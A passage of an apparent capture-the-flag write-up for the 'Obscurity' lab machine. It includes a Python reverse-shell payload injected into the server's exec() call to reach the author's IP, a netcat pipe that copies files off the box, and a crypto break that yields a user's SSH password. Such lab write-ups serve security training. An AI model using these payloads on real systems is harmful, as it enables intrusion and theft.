</span></pre></table></code></div></div><h1 id="analyzing-supersecureserverpy">Analyzing SuperSecureServer.py</h1><p>The <code class="language-plaintext highlighter-rouge">exec()</code> function is used to execute <strong>system</strong> <code class="language-plaintext highlighter-rouge">commands</code> like <code class="language-plaintext highlighter-rouge">os.system()</code>.And its executing the variable <code class="language-plaintext highlighter-rouge">path</code> after <code class="language-plaintext highlighter-rouge">unquoting it</code> and there a <code class="language-plaintext highlighter-rouge">info</code> variable which is holding a <code class="language-plaintext highlighter-rouge">string</code> and then the <strong>info.format(path)</strong> is executing the <code class="language-plaintext highlighter-rouge">decoded</code> value of the variable <code class="language-plaintext highlighter-rouge">path</code></p><h2 id="making-a-script-to-get-a-shell">Making a script to get a shell</h2><p>What i am going to do is crafting a <code class="language-plaintext highlighter-rouge">payload</code> for reverse shell in python which will be url <strong>encoded</strong> and then execute the <code class="language-plaintext highlighter-rouge">payload</code> by <code class="language-plaintext highlighter-rouge">obscurity.htb:8080/payload</code> .I Just made a python script that will <code class="language-plaintext highlighter-rouge">url</code> encode the payload and then execute it</p><blockquote><p>Payload</p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s">'</span><span class="se">\'</span><span class="s">'</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])</span><span class="se">\n</span><span class="s">a=</span><span class="se">\'</span><span class="s">'</span>
</pre></table></code></div></div><blockquote><p>0xprashant.py</p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">urllib</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">'http://obscurity.htb:8080/'</span>

<span class="n">path</span> <span class="o">=</span>  <span class="s">'</span><span class="se">\'</span><span class="s">'</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])</span><span class="se">\n</span><span class="s">a=</span><span class="se">\'</span><span class="s">'</span>

<span class="n">url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span>  <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="n">command</span> <span class="o">=</span> <span class="s">"curl "</span> <span class="o">+</span> <span class="n">url</span>
<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="getting-shell-as-www-data">Getting shell as www-data</h2><p>If i run the script <code class="language-plaintext highlighter-rouge">0xprashant.py</code></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="err">➜</span>  <span class="n">obscurity</span> <span class="n">python3</span> <span class="mi">0</span><span class="n">xprashant</span><span class="p">.</span><span class="n">py</span> 
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">obscurity</span><span class="p">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8080</span><span class="o">/%</span><span class="mi">27</span><span class="o">%</span><span class="mi">0</span><span class="n">Aimport</span><span class="o">%</span><span class="mi">20</span><span class="n">socket</span><span class="o">%</span><span class="mi">2</span><span class="n">Csubprocess</span><span class="o">%</span><span class="mi">2</span><span class="n">Cos</span><span class="o">%</span><span class="mi">3</span><span class="n">Bs</span><span class="o">%</span><span class="mi">3</span><span class="n">Dsocket</span><span class="p">.</span><span class="n">socket</span><span class="o">%</span><span class="mi">28</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="o">%</span><span class="mi">2</span><span class="n">Csocket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">3</span><span class="n">Bs</span><span class="p">.</span><span class="n">connect</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mf">2210.10</span><span class="p">.</span><span class="mf">14.10</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C1234</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">3</span><span class="n">Bos</span><span class="p">.</span><span class="n">dup2</span><span class="o">%</span><span class="mi">28</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">2</span><span class="n">C0</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">3</span><span class="n">Bos</span><span class="p">.</span><span class="n">dup2</span><span class="o">%</span><span class="mi">28</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">2</span><span class="n">C1</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">3</span><span class="n">Bos</span><span class="p">.</span><span class="n">dup2</span><span class="o">%</span><span class="mi">28</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">2</span><span class="n">C2</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">3</span><span class="n">Bp</span><span class="o">%</span><span class="mi">3</span><span class="n">Dsubprocess</span><span class="p">.</span><span class="n">call</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">5</span><span class="n">B</span><span class="o">%</span><span class="mi">22</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="o">-</span><span class="n">i</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">0</span><span class="n">Aa</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">27</span>
</pre></table></code></div></div><p>And on our netcat listener we got shell as <code class="language-plaintext highlighter-rouge">www-data</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>➜  obscurity rlwrap nc <span class="nt">-nlvp</span> 1234
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.168.
Ncat: Connection from 10.10.10.168:41296.
www-data@obscure:/<span class="nv">$ </span>
</pre></table></code></div></div><h1 id="privilege-escalation-to-robert">Privilege escalation to robert</h1><p>There is one valid user in <code class="language-plaintext highlighter-rouge">/home</code> dir, and its <code class="language-plaintext highlighter-rouge">robert</code> and Fortunatly we have read permissions to the <code class="language-plaintext highlighter-rouge">dir</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>www-data@obscure:/home<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 12
drwxr-xr-x  3 root   root   4096 Sep 24  2019 <span class="nb">.</span>
drwxr-xr-x 24 root   root   4096 Oct  3  2019 ..
drwxr-xr-x  7 robert robert 4096 May  9 07:28 robert
</pre></table></code></div></div><p>So we can read the content of the dir <code class="language-plaintext highlighter-rouge">robert</code>……</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>www-data@obscure:/home/robert<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
<span class="nb">ls</span> <span class="nt">-l</span>
total 24
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
<span class="nt">-rw-rw-r--</span> 1 robert robert   94 Sep 26  2019 check.txt
<span class="nt">-rw-rw-r--</span> 1 robert robert  185 Oct  4  2019 out.txt
<span class="nt">-rw-rw-r--</span> 1 robert robert   27 Oct  4  2019 passwordreminder.txt
<span class="nt">-rwxrwxr-x</span> 1 robert robert 2514 Oct  4  2019 SuperSecureCrypt.py
<span class="nt">-rwx------</span> 1 robert robert   33 Sep 25  2019 user.txt
</pre></table></code></div></div><p>There are couple of files one is <code class="language-plaintext highlighter-rouge">SuperSecureCrypt.py</code> . The script is following</p><blockquote><p>SuperSecureCrypt.py</p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">argparse</span>

<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">encrypted</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span>
        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
        <span class="n">encrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
    <span class="k">return</span> <span class="n">encrypted</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">decrypted</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span>
        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
        <span class="n">decrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
    <span class="k">return</span> <span class="n">decrypted</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Encrypt with 0bscura</span><span class="se">\'</span><span class="s">s encryption algorithm'</span><span class="p">)</span>

<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-i'</span><span class="p">,</span>
                    <span class="n">metavar</span><span class="o">=</span><span class="s">'InFile'</span><span class="p">,</span>
                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
                    <span class="n">help</span><span class="o">=</span><span class="s">'The file to read'</span><span class="p">,</span>
                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-o'</span><span class="p">,</span>
                    <span class="n">metavar</span><span class="o">=</span><span class="s">'OutFile'</span><span class="p">,</span>
                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
                    <span class="n">help</span><span class="o">=</span><span class="s">'Where to output the encrypted/decrypted file'</span><span class="p">,</span>
                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-k'</span><span class="p">,</span>
                    <span class="n">metavar</span><span class="o">=</span><span class="s">'Key'</span><span class="p">,</span>
                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
                    <span class="n">help</span><span class="o">=</span><span class="s">'Key to use'</span><span class="p">,</span>
                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">'store_true'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Decrypt mode'</span><span class="p">)</span>

<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="n">banner</span> <span class="o">=</span> <span class="s">"################################</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span><span class="o">+=</span> <span class="s">"#           BEGINNING          #</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span><span class="o">+=</span> <span class="s">"#    SUPER SECURE ENCRYPTOR    #</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span><span class="o">+=</span> <span class="s">"################################</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span> <span class="o">+=</span> <span class="s">"  ############################</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span> <span class="o">+=</span> <span class="s">"  #        FILE MODE         #</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span> <span class="o">+=</span> <span class="s">"  ############################"</span>
<span class="k">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">o</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">args</span><span class="p">.</span><span class="n">k</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">args</span><span class="p">.</span><span class="n">i</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Missing args"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">d</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Opening file {0}..."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">i</span><span class="p">))</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

        <span class="k">print</span><span class="p">(</span><span class="s">"Decrypting..."</span><span class="p">)</span>
        <span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">k</span><span class="p">)</span>

        <span class="k">print</span><span class="p">(</span><span class="s">"Writing to {0}..."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">o</span><span class="p">))</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">o</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Opening file {0}..."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">i</span><span class="p">))</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

        <span class="k">print</span><span class="p">(</span><span class="s">"Encrypting..."</span><span class="p">)</span>
        <span class="n">encrypted</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">k</span><span class="p">)</span>

        <span class="k">print</span><span class="p">(</span><span class="s">"Writing to {0}..."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">o</span><span class="p">))</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">o</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
</pre></table></code></div></div><p>The box name should be <code class="language-plaintext highlighter-rouge">Python</code> To be honest lol XD, I mean here is Python <code class="language-plaintext highlighter-rouge">Everywhere</code>.</p><blockquote><p>passwordreminder.txt</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>www-data@obscure:/home/robert<span class="nv">$ </span><span class="nb">cat </span>passwordreminder.txt
<span class="nb">cat </span>passwordreminder.txt
´ÑÈÌÉàÙÁÑé¯·¿k
</pre></table></code></div></div><blockquote><p>check.txt</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>www-data@obscure:/home/robert<span class="nv">$ </span><span class="nb">cat </span>check.txt
<span class="nb">cat </span>check.txt
Encrypting this file with your key should result <span class="k">in </span>out.txt, make sure your key is correct! 
</pre></table></code></div></div><blockquote><p>out.txt</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>www-data@obscure:/home/robert<span class="nv">$ </span><span class="nb">cat </span>out.txt
<span class="nb">cat </span>out.txt
¦ÚÈêÚÞØÛÝÝ	×ÐÊß
¦ÚÈêÚÞØÛÝÝ	×ÐÊß
ÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐ
êÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäè	ÎÍÚÎëÑÓäáÛÌ×	v
</pre></table></code></div></div><p>And i transfered all the <code class="language-plaintext highlighter-rouge">four</code> files to my machine , Since netcat is already installed we can use it to transfer files.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>www-data@obscure:/home/robert<span class="nv">$ </span><span class="nb">cat </span>SuperSecureCrypt.py | nc 10.10.14.10 2345
<span class="nb">cat </span>SuperSecureCrypt.py | nc 10.10.14.10 2345
</pre></table></code></div></div><blockquote><p>And on my machine</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>➜  obscurity nc <span class="nt">-nlvp</span> 2345 <span class="o">&gt;&gt;</span> SuperSecureCrypt.py
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::2345
Ncat: Listening on 0.0.0.0:2345
Ncat: Connection from 10.10.10.168.
Ncat: Connection from 10.10.10.168:41880.
</pre></table></code></div></div><blockquote><p>Like This i got all the four files to my machine.</p></blockquote><h2 id="analyzing-supersecurecryptpy">Analyzing SuperSecureCrypt.py</h2><p>The python script has two functions <code class="language-plaintext highlighter-rouge">decrypt:Decryption</code> and <code class="language-plaintext highlighter-rouge">encrypt:encryption</code> . And the files <code class="language-plaintext highlighter-rouge">check.txt</code> , <code class="language-plaintext highlighter-rouge">out.txt</code> , <code class="language-plaintext highlighter-rouge">passowrdreminder.txt</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>➜  obscurity python3 SuperSecureCrypt.py <span class="nt">-h</span>
usage: SuperSecureCrypt.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-i</span> InFile] <span class="o">[</span><span class="nt">-o</span> OutFile] <span class="o">[</span><span class="nt">-k</span> Key] <span class="o">[</span><span class="nt">-d</span><span class="o">]</span>

Encrypt with 0bscura<span class="s1">'s encryption algorithm

optional arguments:
  -h, --help  show this help message and exit
  -i InFile   The file to read
  -o OutFile  Where to output the encrypted/decrypted file
  -k Key      Key to use
  -d          Decrypt mode
</span></pre></table></code></div></div><p>And we can supply many things …like infile , Outfile, and a key ,</p><p>From the <strong>check.txt</strong> I figured it out that <code class="language-plaintext highlighter-rouge">out.txt</code> is the output after <code class="language-plaintext highlighter-rouge">encrypting</code> the file <code class="language-plaintext highlighter-rouge">check.txt</code>, The content of <code class="language-plaintext highlighter-rouge">check.txt</code> will be the key and the infile will be <code class="language-plaintext highlighter-rouge">out.txt</code></p><p>So we can use the <code class="language-plaintext highlighter-rouge">decrypt</code> <strong>function</strong> to get <code class="language-plaintext highlighter-rouge">out.txt</code> decrypted.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>➜  obscurity python3 SuperSecureCrypt.py <span class="nt">-i</span> out.txt <span class="nt">-k</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">cat </span>check.txt<span class="si">)</span><span class="s2">"</span> <span class="nt">-o</span> output <span class="nt">-d</span>
<span class="c">################################</span>
<span class="c">#           BEGINNING          #</span>
<span class="c">#    SUPER SECURE ENCRYPTOR    #</span>
<span class="c">################################</span>
  <span class="c">############################</span>
  <span class="c">#        FILE MODE         #</span>
  <span class="c">############################</span>
Opening file out.txt...
Decrypting...
Writing to output...
➜  obscurity <span class="nb">cat </span>output 
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai
</pre></table></code></div></div><p>And we got it !!</p><p>Now we have an another file called <code class="language-plaintext highlighter-rouge">passwordreminder.txt</code> , Now i can use the <strong>passwordreminder.txt</strong> as <code class="language-plaintext highlighter-rouge">infile</code> and the <code class="language-plaintext highlighter-rouge">output</code> file as the key.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>➜  obscurity python3 SuperSecureCrypt.py <span class="nt">-i</span> passwordreminder.txt <span class="nt">-k</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">cat </span>output<span class="si">)</span><span class="s2">"</span> <span class="nt">-o</span> output2 <span class="nt">-d</span>
<span class="c">################################</span>
<span class="c">#           BEGINNING          #</span>
<span class="c">#    SUPER SECURE ENCRYPTOR    #</span>
<span class="c">################################</span>
  <span class="c">############################</span>
  <span class="c">#        FILE MODE         #</span>
  <span class="c">############################</span>
Opening file passwordreminder.txt...
Decrypting...
Writing to output2...
➜  obscurity <span class="nb">cat </span>output2 
SecThruObsFTW
</pre></table></code></div></div><p>And we got the <code class="language-plaintext highlighter-rouge">string</code> to be <strong>decrypted</strong>. <code class="language-plaintext highlighter-rouge">SecThruObsFTW</code></p><h1 id="login-as-robert">Login as robert</h1><p>The string we got decrypted is actually the password for user <code class="language-plaintext highlighter-rouge">robert</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>➜  obscurity sshpass <span class="nt">-p</span> SecThruObsFTW ssh robert@obscurity.htb 
Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-65-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

Last login: Sat May  9 07:08:30 2020 from 10.10.14.10
robert@obscure:~<span class="nv">$ </span>
</pre></table></code></div></div><h1 id="got-usertxt">Got user.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>robert@obscure:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
e44--------------------------2d7
robert@obscure:~<span class="err">$</span>
</pre></table></code></div></div><h1 id="privilege-escalation-to-root">Privilege Escalation to Root</h1><h2 id="method-1-intended">Method 1 (intended)</h2><p>Now If we run <code class="language-plaintext highlighter-rouge">sudo -l</code> we can see that we can run the script <code class="language-plaintext highlighter-rouge">BetterSSH.py</code> as root……</p><blockquote><p>BetterSSH.py</p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">random</span><span class="p">,</span> <span class="n">string</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">crypt</span>
<span class="kn">import</span> <span class="nn">traceback</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="n">path</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">8</span><span class="p">))</span>
<span class="n">session</span> <span class="o">=</span> <span class="p">{</span><span class="s">"user"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span> <span class="s">"authenticated"</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span>
<span class="k">try</span><span class="p">:</span>
